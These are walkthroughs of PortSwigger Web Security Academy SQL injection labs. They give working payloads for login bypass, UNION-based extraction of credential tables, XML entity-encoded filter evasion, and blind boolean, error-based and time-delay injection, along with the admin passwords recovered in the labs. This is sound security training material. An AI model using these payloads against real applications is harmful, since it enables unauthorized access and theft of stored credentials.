## SQLi vulnerability in WHERE clause allowing retrieval of hidden data
[SQLi vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Write-up:

1. `https://0a8200540493743e8242621b00b100be.web-security-academy.net/filter?category=Gifts'+OR+1=1--`

## SQLi vulnerability allowing login bypass
[SQLi vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Write-up:

1. Submitting `administrator'--` as username successfully bypasses password check and solves lab.

## SQLi with filter bypass via XML encoding
[SQLi with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

Write-up:

1. We are told we can use a UNION attack in the "Check Stock" feature. This is the
relevant request: <br>

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```

2. Creating a UNION attack to retrieve the admin credentials: <br>

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1 &#x55;NION &#x53;ELECT * FROM users
        </storeId>
    </stockCheck>
    ```

    When we try to return more than one column, the application returns 0 units, implying an error. 
    However, retrieving just the usernames works correctly. <br>
    NOTE: Since there are only 3 users, we could retrieve the 3 passwords and attempt
    to use them with `admin`. However, for learning purposes, we will use string concatenation.

3. The following payload retrieves the admin credentials correctly:

    For readibility purposes: `1 UNION SELECT username||':'||password FROM users` <br>

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck>
        <productId>
            1
        </productId>
        <storeId>
        &#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x7C;&#x7C;&#x27;&#x3A;&#x27;&#x7C;&#x7C;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
        </storeId>  
    </stockCheck>
    ```

    This returns the admin credentials and allows us to login as admin: `administrator:49tcni0w6lx9ipd1201z`

## SQLi: querying database type and version on Oracle
[SQLi: querying database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Write-up:

1. We are told we can attack the product category filter: `GET /filter?category=Lifestyle HTTP/1.1`

2. We need to determine the number of columns that are being returned by the query: <br>

    `category=Lifestyle' ORDER BY 1--` - works fine
    `category=Lifestyle' ORDER BY 2--` - works fine
    `category=Lifestyle' ORDER BY 3--` - Internal Server Error

    This shows us that the query is returning two columns.

3. `category=' UNION SELECT BANNER,NULL FROM v$version--` solves the lab.

## SQLi: querying database type and version on MySQL and Microsoft
[SQLi: querying database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

Write-up:

1. We are told we can attack the product category filter: `GET /filter?category=Lifestyle HTTP/1.1`

2. To determine number of columns: `category='ORDER BY 1-- ` - attention to the space at the end.
We get 2 columns.

3. `category='UNION SELECT @@version, NULL-- ` solves the lab: again, attention to space at the end.

## SQLi: listing database contents on non-Oracle databases
[SQLi: listing database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Write-up:

1. As in previous labs, we discover the query is returning two columns.

2. `category=' UNION SELECT table_schema,table_name FROM information_schema.tables-- ` shows
us there is a table called `users_qhhwwm`.

3. `category=' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_qhhwwm'-- ` shows
us the table columns are called `email`, `password_evabhc` and `username_medbtd`.

4. `category=' UNION SELECT username_medbtd,password_evabhc FROM users_qhhwwm-- ` gets
us the admin credentials: `administrator:uiw5gqsuk9mlvk50030s`.

5. Logging in as `administrator` solves the lab.

## SQLi: listing database contents on Oracle databases
[SQLi: listing database contents on Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

Write-up:

1. As in previous labs, we discover the query is returning two columns.

2. `category=' UNION SELECT table_name,NULL FROM all_tables-- ` shows us there is a 
table called `USERS_QNDWSK`.

3. `category=' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_QNDWSK'-- ` shows
us the table columns are `EMAIL`, `PASSWORD_WXPMCK` and `USERNAME_MBAQIL`.

4. `category=' UNION SELECT USERNAME_MBAQIL,PASSWORD_WXPMCK FROM USERS_QNDWSK-- ` gets
us the admin credentials: `administrator:3cwa2brpg1ivqhvirven`.

5. Logging in as `administrator` solves the lab.

## SQLi UNION: determining number of columns returned by query
[SQLi UNION: determining number of columns returned by query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Write-up:

1. `category=' UNION SELECT NULL--` returns an error, so we need to add more columns.

2. `category=' UNION SELECT NULL,NULL,NULL--` doesn't return an error, which means
there are 3 columns. This solves the lab.

## SQLi UNION: findind a column containing text
[SQLi UNION: findind a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Write-up:

1. We first assert there are 3 columns, as in previous labs.

2. Using `category=' UNION SELECT NULL,'94yvfI',NULL--`, we can retrieve '94yvfl' as instructed.

## SQLi UNION: retrieving data from other tables
[SQLi UNION: retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Write-up:

1. `category=' UNION SELECT username,password FROM users-- ` returns admin 
credentials: `administrator:ylbfnitt115twdhupb5x`.

2. Logging in solves the lab.

## SQLi UNION: retrieving multiple values in a single column
[SQLi UNION: retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

Write-up:

1. `category=' UNION SELECT username,password FROM users-- ` doesn't work. We 
determine that only second column accepts text.

2. `'+UNION+SELECT+NULL,username||':'||password+FROM+users--+ ` returns admin
credentials: `administrator:2nt76d9q9ccptqkn5ghj`

3. Logging in solves the lab.

## Blind SQLi with conditional responses
[Blind SQLi with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Write-up:

1. When intercepting the "filter by category" request, we see the following: 
`Cookie: TrackingId=YCtmSKirnj4hzm6p;`

    We can test for SQLi, using the following payloads: <br>
    ```
    TrackingId=YCtmSKirnj4hzm6p' AND '1'='1
    TrackingId=YCtmSKirnj4hzm6p' AND '1'='2
    ```

    Since one returns "Welcome back" and the other doesn't, it's exploitable.

2. `TrackingId=YCtmSKirnj4hzm6p' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` <br>

    Attempting this payload with increasing length shows us the password is 20 characters long.
   
3. `TrackingId=YCtmSKirnj4hzm6p' AND SUBSTRING((SELECT password FROM users WHERE usernamme = 'administrator'), 1, 1) > 't` <br>

    Attempting this payload with different characters would return the password. 
    However, for convenience, I crafted a Python script that automates this task: `blind-sqli-brute-conditional-response.py`.
    This script will be used for this and next tasks.

4. Running the script gets us the admin credentials:

    ```
    👤 Username: administrator
    🔑 Password: cby5mw7cwy4raxgddyu6
    ```

5. Logging in solves the lab.

## Blind SQLi with conditional errors
[Blind SQLi with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

Write-up: 
1. The following payload causes an error: `TrackingId=YCtmSKirnj4hzm6p'` shows us that an error appears.

2. For convenience purposes, I crafted a script: `blind-sqli-brute-conditional-error.py` - 
to facilitate this lab following the content in [this page](https://portswigger.net/web-security/sql-injection/blind)

3. Running the script gets us the admin credentials, and logging in solves the lab.

    ```
    👤 Username: administrator
    🔑 Password: d926i9mbt4v1he634x56
    ```

## Visible error-based SQLi
[Visible error-based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

Write-up:

1. The following payload causes an error: `TrackingId=KEDRwKmwOqWdVjO2'` shows us that an 
error appears: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'KEDRwKmwOqWdVjO2''. Expected char`

2. `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;` returns more 
than one row, so we can add a limit.

3. `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;` shows us that the first user 
in the table is `administrator`. We can use a similar query to retrieve the passwsord.

4. `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;` returns the password: `cirz63409jaluqnr2pme`

5. Logging in solves the lab.

## Blind SQLi with time delays
[Blind SQLi with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Write-up:

1. Attempting `TrackingId=' UNION SELECT SLEEP(10)-- ;` and all the other 
different database syntaxes didn't work. After further research, i found out i needed to
use concatenation.

2. `TrackingId='||pg_sleep(10)-- ;` solved the lab.

## Blind SQLi with time delays and information retrieval
[Blind SQLi with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

Write-up:

1. `TrackingId='||pg_sleep(10)-- ;` works. Now we need to get the password for 
the `administrator` user.

2. In order to extract the password, I created a script: `time-based-sqli-extract-password.py` <br>
This script first determines the password length, and then extracts the password. <br>
Credentials: `administrator:hof5lgax2bcp1846s93e`

3. Logging in solves the lab.

NOTE: Missing blind SQL injection using out-of-band (OAST) techniques